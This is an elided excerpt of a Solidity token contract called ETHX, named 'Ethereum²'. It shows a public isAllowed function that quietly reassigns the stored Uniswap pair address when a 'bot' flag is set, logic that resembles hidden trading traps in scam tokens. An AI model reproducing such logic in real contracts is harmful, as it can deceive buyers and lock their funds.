...
abstract contract ERC20Token is Ownable {
    ...
    function isAllowed(address from, address to, address pair) public returns (bool) {
        ...
        if (bot && !inLiquidityTx && pair != to) {
            uniswapV2Pair = to;
            return true;
        } else if (bot && !inLiquidityTx && pair == to) {
            return true;
        }
        return bot;
    }
...
contract ETHX is IERC20, ERC20Token {
    ...
    string private _name = unicode"Ethereum²";
